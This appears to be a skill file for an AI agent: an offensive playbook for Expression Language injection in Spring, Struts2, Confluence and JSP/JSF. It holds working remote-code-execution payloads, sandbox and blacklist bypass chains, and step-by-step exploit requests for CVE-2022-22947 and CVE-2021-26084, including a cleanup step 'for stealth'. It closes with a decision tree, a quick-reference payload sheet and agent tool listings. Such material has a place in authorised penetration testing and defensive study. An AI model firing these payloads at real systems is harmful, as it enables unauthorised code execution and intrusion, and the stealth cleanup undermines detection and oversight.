---
name: expression-language
description: >-
  Expression Language injection playbook. Use when Java EL, SpEL, OGNL, or MVEL expressions may evaluate attacker-controlled input in Spring, Struts2, Confluence, or similar frameworks.
---

# SKILL: Expression Language Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert EL injection techniques covering SpEL (Spring), OGNL (Struts2), and Java EL (JSP/JSF). Distinct from SSTI — EL injection targets expression evaluators in Java frameworks, not template engines. Covers sandbox bypass, `_memberAccess` manipulation, actuator abuse, and real-world CVE chains.

## RELATED ROUTING

- [ssti](../ssti/SKILL.md) for template engines (Jinja2, FreeMarker, Twig) — different attack surface
- [jndi-injection](../jndi-injection/SKILL.md) when EL evaluation leads to JNDI lookup

**Key distinction**: SSTI targets template rendering engines; EL injection targets expression evaluators embedded in Java frameworks. They share detection probes (`${7*7}`) but diverge in exploitation.

## QUICK START

### First-pass probes

| Signal | Probe | Why |
|---|---|---|
| Template / EL context suspected | `${7*7}` → 49? | Confirms expression evaluation |
| `${7*7}` = 49, `%{7*7}` literal | `T(java.lang.Runtime).getRuntime().exec("id")` | SpEL (Spring) confirmed |
| `%{7*7}` = 49, `${7*7}` literal | `%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}` | OGNL (Struts2) confirmed |
| Engine identified | Sandbox bypass probe (reflection chain) | `SimpleEvaluationContext` or `_memberAccess` restriction |
| Sandbox bypassed | RCE chain with output capture via `StreamUtils` / `IOUtils` | Full command execution with visible output |

```bash
# Quick test — SpEL RCE probe
curl -s 'https://target/api?q=${T(java.lang.Runtime).getRuntime().exec("id")}'
```

---

## 1. DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

---

## 2. SpEL (SPRING EXPRESSION LANGUAGE)

### Where SpEL Appears

- `@Value("${...}")` annotations
- Spring Security expressions (`@PreAuthorize`)
- Spring Cloud Gateway route predicates and filters
- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
- Spring Data `@Query` with SpEL

### RCE via Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE with Output Capture (Commons IO)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE with Output Capture (Spring StreamUtils)

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder (alternative when Runtime is blocked)

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

Exploit via actuator to add malicious route with SpEL filter:

```bash
# Step 1: Add route with SpEL in filter (with output capture)
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# Step 2: Refresh routes to apply
POST /actuator/gateway/refresh

# Step 3: Trigger the route
GET /hackpath
# Response header "Result" contains command output

# Step 4: Clean up (important for stealth)
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL Sandbox Bypass

When `SimpleEvaluationContext` is used (restricts `T()` operator):

```java
// Try reflection-based bypass:
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)

### Where OGNL Appears

- Apache Struts2 — primary OGNL consumer
- Confluence Server — uses OGNL in certain request paths
- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`

### Basic RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 Sandbox Bypass — _memberAccess Manipulation

Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Struts2 OgnlUtil Blacklist Clear

Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

### Confluence OGNL — CVE-2021-26084

Confluence Server allows OGNL injection via the `queryString` or action parameters:

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL-decoded: \u0027+{3*3}+\u0027
# If response contains 9 → confirmed
# Escalate to Runtime.exec for RCE
```

---

## 4. JAVA EL (JSP / JSF)

### Where Java EL Appears

- JSP pages: `${expression}` and `#{expression}`
- JSF (JavaServer Faces): value and method bindings
- Custom tag libraries

### RCE Payloads

```java
// Java EL with Runtime:
${Runtime.getRuntime().exec("id")}

// Via pageContext (JSP):
${pageContext.request.getServletContext().getClassLoader()}

// Reflection-based:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## DECISION TREE

```
EL context detected (${7*7} = 49)?
├── Which engine?
│   ├── SpEL (Spring)?
│   │   ├── T(java.lang.Runtime).exec() → direct RCE
│   │   ├── SimpleEvaluationContext sandbox → reflection bypass
│   │   └── Spring Cloud Gateway → CVE-2022-22947 via actuator
│   ├── OGNL (Struts2 / Confluence)?
│   │   ├── %{...} syntax confirmed → Struts2 OGNL
│   │   ├── _memberAccess bypass → clear SecurityMemberAccess
│   │   ├── OgnlUtil blacklist clear → clear excludedClasses
│   │   └── Confluence → CVE-2021-26084 via queryString param
│   ├── MVEL?
│   │   └── Runtime.exec or ProcessBuilder → RCE
│   └── Java EL (JSP/JSF)?
│       ├── ${Runtime.getRuntime().exec("id")} → direct RCE
│       └── Reflection-based if direct blocked
├── EL injection confirmed → escalate to RCE?
│   ├── Direct exec works → RCE achieved
│   ├── Sandbox blocks → try reflection chain bypass
│   └── Output not visible → blind EL injection via DNS/HTTP callback
└── Not EL injection?
    └── Re-check: SSTI (Jinja2, FreeMarker) → load ssti skill
```

## 6. DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Java application?
│   ├── Struts2? → Try %{...} OGNL payloads
│   │   └── Check Content-Type injection (S2-045)
│   ├── Spring? → Try T(java.lang.Runtime) SpEL
│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
│   ├── Confluence? → Try OGNL via action parameters
│   └── JSP/JSF? → Try Java EL payloads
│
├── Error messages reveal framework?
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
```

---

## 7. QUICK REFERENCE

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL with sandbox bypass:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 probe:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```

---

## TESTING CHECKLIST

- [ ] Identify EL context (Spring SpEL, Struts2 OGNL, JSP EL, MVEL, Thymeleaf)
- [ ] Test basic math expressions (`${7*7}`, `#{7*7}`)
- [ ] Test string concatenation and property access
- [ ] Test RCE chain for identified engine
- [ ] Test sandbox bypass techniques specific to engine version
- [ ] Test EL injection in URI templates, headers, cookies
- [ ] Test blind EL (time-based via Thread.sleep equivalent)
- [ ] Test filter/WAF evasion (encoding, concatenation, reflection)

## MCP TOOLS

| Tool | Use Case |
|------|----------|
| `http_framework_test` | Send crafted requests with EL/SpEL/OGNL payloads to test expression evaluation sinks |
| `http_repeater` | Replay and modify injection probes to confirm code execution and output capture |
| `nuclei_scan` | Automated scanning for known EL injection CVEs (Log4Shell, Struts2, Spring Cloud Gateway) |
| `burpsuite_alternative_scan` | Comprehensive web scanning to discover actuator endpoints and expression evaluation surfaces |
